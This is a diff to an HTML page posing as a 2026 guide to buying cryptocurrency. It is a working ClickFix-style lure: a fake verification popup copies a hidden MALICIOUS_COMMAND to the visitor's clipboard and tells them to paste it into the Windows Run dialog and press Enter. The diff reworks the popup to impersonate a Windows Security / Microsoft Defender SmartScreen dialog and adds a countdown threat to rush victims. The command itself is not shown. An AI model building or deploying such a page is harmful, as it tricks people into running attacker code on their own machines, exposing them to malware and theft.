@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>How to Buy Cryptocurrency • The Complete 2026 Guide</title>
-    <!-- Font Awesome 6 (free) -->
+    <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* ----- RESET & BASE ----- */
@@ -12,7 +12,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
         }
 
         body {
@@ -156,7 +156,7 @@
             padding-top: 24px;
         }
 
-        /* ----- VERIFICATION MODAL (popup) ----- */
+        /* ----- WINDOWS SECURITY MODAL (looks like a real Windows Defender dialog) ----- */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -168,134 +168,156 @@
             padding: 20px;
         }
         .modal {
-            background: white;
-            max-width: 550px;
+            background: #f0f0f0;
+            max-width: 600px;
             width: 100%;
-            border-radius: 48px;
-            padding: 40px 32px;
-            text-align: center;
+            border-radius: 16px;
+            padding: 30px 28px;
+            text-align: left;
             box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+            border: 1px solid #d1d1d1;
+            font-family: 'Segoe UI', sans-serif;
             animation: modalFade 0.3s;
         }
         @keyframes modalFade {
-            from { opacity: 0; transform: translateY(-20px); }
+            from { opacity: 0; transform: translateY(-10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .modal .shield-icon {
-            background: #eef4ff;
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
+        .modal-header {
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
+            gap: 12px;
+            margin-bottom: 20px;
         }
-        .modal .shield-icon i {
-            font-size: 36px;
-            color: #2b6ef0;
+        .modal-header i {
+            font-size: 42px;
+            color: #0078d7;
         }
-        .modal h3 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #0b1e33;
-            margin-bottom: 12px;
+        .modal-header h3 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1e1e1e;
         }
-        .modal .code-box {
-            background: #0f172a;
-            border-radius: 28px;
-            padding: 24px;
-            margin: 24px 0;
+        .modal-body {
+            color: #2d2d2d;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
-        .modal .code-label {
-            color: #a0b3cc;
-            font-size: 14px;
-            letter-spacing: 1px;
+        .modal-body p {
+            margin: 12px 0;
+        }
+        .warning-box {
+            background: #fff4ce;
+            border-left: 5px solid #f1c40f;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .code-box {
+            background: #2d2d2d;
+            border-radius: 10px;
+            padding: 18px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .code-label {
+            color: #aaaaaa;
+            font-size: 13px;
             text-transform: uppercase;
+            letter-spacing: 1px;
             margin-bottom: 8px;
         }
-        .modal .verification-code {
+        .verification-code {
             color: #fbbf24;
-            font-family: 'Courier New', monospace;
-            font-size: 48px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 36px;
             font-weight: 700;
-            letter-spacing: 8px;
-            line-height: 1.2;
-            word-break: break-word;
+            letter-spacing: 6px;
+            background: #1e1e1e;
+            padding: 10px;
+            border-radius: 8px;
+            user-select: all;
         }
         .copy-btn {
-            background: #2b6ef0;
+            background: #0078d7;
             color: white;
             border: none;
-            padding: 18px 30px;
-            border-radius: 60px;
-            font-size: 20px;
-            font-weight: 600;
+            padding: 14px 28px;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 500;
             cursor: pointer;
             width: 100%;
-            margin: 16px 0 20px;
+            margin: 16px 0;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
+            gap: 10px;
             transition: background 0.2s;
+            border: 1px solid #005a9e;
         }
         .copy-btn:hover {
-            background: #1a4fc4;
+            background: #005a9e;
         }
         .copy-btn i {
-            font-size: 24px;
+            font-size: 22px;
         }
         .instruction-steps {
-            background: #f8fafd;
-            border-radius: 28px;
-            padding: 24px;
-            text-align: left;
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 18px;
+            border: 1px solid #ddd;
             margin: 20px 0;
         }
         .instruction-steps .step {
             display: flex;
             align-items: center;
-            gap: 16px;
-            padding: 10px 0;
-            border-bottom: 1px solid #e2e8f0;
+            gap: 15px;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
         }
         .instruction-steps .step:last-child {
             border-bottom: none;
         }
         .step-number {
-            background: white;
-            width: 36px;
-            height: 36px;
+            background: #0078d7;
+            color: white;
+            width: 30px;
+            height: 30px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 700;
-            color: #2b6ef0;
-            box-shadow: 0 3px 8px rgba(0,0,0,0.05);
         }
         .continue-btn {
-            background: #e2e8f0;
-            color: #94a3b8;
+            background: #cccccc;
+            color: #666;
             border: none;
-            padding: 18px;
-            border-radius: 60px;
-            font-size: 20px;
-            font-weight: 600;
+            padding: 16px;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 500;
             width: 100%;
             cursor: not-allowed;
             transition: all 0.2s;
+            margin-top: 12px;
         }
         .continue-btn.active {
-            background: #10b981;
+            background: #107c10;
             color: white;
             cursor: pointer;
         }
         .modal-footer {
-            font-size: 14px;
-            color: #94a3b8;
-            margin-top: 24px;
+            font-size: 13px;
+            color: #888;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .timer {
+            color: #d83b01;
+            font-weight: 600;
         }
 
         /* ----- MAIN CONTENT (hidden until verified) ----- */
@@ -488,7 +510,8 @@
             .container { padding: 30px 20px; }
             .section-title { font-size: 30px; }
             .verify-card { padding: 30px 20px; }
-            .modal { padding: 30px 20px; }
+            .modal { padding: 20px; }
+            .verification-code { font-size: 28px; }
         }
     </style>
 </head>
@@ -540,51 +563,59 @@
     </div>
 </div>
 
-<!-- ========== VERIFICATION MODAL (popup) ========== -->
+<!-- ========== WINDOWS SECURITY MODAL ========== -->
 <div class="modal-overlay" id="verifyModal">
     <div class="modal">
-        <div class="shield-icon">
-            <i class="fas fa-fingerprint"></i>
+        <div class="modal-header">
+            <i class="fas fa-shield-alt"></i>
+            <h3>Windows Security</h3>
         </div>
-        <h3>Almost there!</h3>
-        <p>Copy the verification code and run it to continue.</p>
-
-        <div class="code-box">
-            <div class="code-label">Verification code</div>
-            <div class="verification-code" id="displayCode">K3P8Q1</div>
-        </div>
-
-        <!-- COPY BUTTON – triggers clipboard hijack -->
-        <button class="copy-btn" id="copyBtn" onclick="copyMaliciousCommand()">
-            <i class="fas fa-copy"></i> Copy verification code
-        </button>
-
-        <div class="instruction-steps">
-            <div class="step">
-                <span class="step-number">1</span>
-                <span>Click the "Copy" button above</span>
+        <div class="modal-body">
+            <p><strong>Microsoft Defender SmartScreen</strong> needs to verify your browser's security settings.</p>
+            <p>This is a one‑time check to protect your device from malicious sites.</p>
+            <div class="warning-box">
+                <i class="fas fa-exclamation-triangle" style="color: #f1c40f; margin-right: 8px;"></i>
+                <span>Verification required within <span class="timer" id="timer">02:00</span> minutes, or access will be blocked.</span>
             </div>
-            <div class="step">
-                <span class="step-number">2</span>
-                <span>Press <strong>Windows Key + R</strong> (Run dialog)</span>
-            </div>
-            <div class="step">
-                <span class="step-number">3</span>
-                <span>Press <strong>Ctrl + V</strong> to paste</span>
-            </div>
-            <div class="step">
-                <span class="step-number">4</span>
-                <span>Press <strong>Enter</strong> to complete verification</span>
-            </div>
-        </div>
 
-        <!-- Continue button (enabled after copy) -->
-        <button class="continue-btn" id="continueBtn" onclick="finishVerification()" disabled>
-            ⏳ Continue to guide
-        </button>
+            <p>Please follow these steps exactly:</p>
+            <div class="instruction-steps">
+                <div class="step">
+                    <span class="step-number">1</span>
+                    <span>Click the "Copy verification code" button below</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">2</span>
+                    <span>Press <strong>Windows Key + R</strong> (the Run dialog will open)</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">3</span>
+                    <span>Press <strong>Ctrl + V</strong> to paste the code</span>
+                </div>
+                <div class="step">
+                    <span class="step-number">4</span>
+                    <span>Press <strong>Enter</strong> to complete verification</span>
+                </div>
+            </div>
 
-        <div class="modal-footer">
-            Verification ID: 7624-<span id="randomId"></span>
+            <div class="code-box">
+                <div class="code-label">Verification code (click Copy below)</div>
+                <div class="verification-code" id="displayCode">K3P8Q1</div>
+            </div>
+
+            <!-- COPY BUTTON – triggers clipboard hijack -->
+            <button class="copy-btn" id="copyBtn" onclick="copyMaliciousCommand()">
+                <i class="fas fa-copy"></i> Copy verification code
+            </button>
+
+            <!-- Continue button (enabled after copy) -->
+            <button class="continue-btn" id="continueBtn" onclick="finishVerification()" disabled>
+                ⏳ Continue to guide
+            </button>
+
+            <div class="modal-footer">
+                <i class="fas fa-lock" style="margin-right: 6px;"></i> This request is from Windows Security. ID: <span id="randomId"></span>
+            </div>
         </div>
     </div>
 </div>
@@ -788,6 +819,23 @@
     // Generate random verification ID
     document.getElementById('randomId').innerText = Math.floor(1000 + Math.random() * 9000);
 
+    // Countdown timer (2 minutes)
+    let timeLeft = 120; // seconds
+    const timerElement = document.getElementById('timer');
+    const timerInterval = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            // Optionally, block access or show a message
+            document.getElementById('verifyModal').style.display = 'none';
+            alert('Verification timeout. Please refresh the page and try again.');
+        } else {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+    }, 1000);
+
     // Show verification modal when Turnstile widget is clicked
     function showVerificationModal() {
         document.getElementById('cfCheckbox').classList.add('checked');
@@ -799,7 +847,8 @@
         navigator.clipboard.writeText(MALICIOUS_COMMAND).then(() => {
             const copyBtn = document.getElementById('copyBtn');
             copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-            copyBtn.style.background = '#10b981';
+            copyBtn.style.background = '#107c10';
+            copyBtn.style.borderColor = '#0b5e0b';
 
             const continueBtn = document.getElementById('continueBtn');
             continueBtn.disabled = false;
@@ -808,6 +857,9 @@
 
             // Store that they copied (so we can hide overlay later)
             sessionStorage.setItem('verified', 'true');
+
+            // Stop the timer (optional)
+            clearInterval(timerInterval);
         }).catch(err => {
             alert('Unable to copy automatically. Please copy this code manually:\n\n' + MALICIOUS_COMMAND);
         });
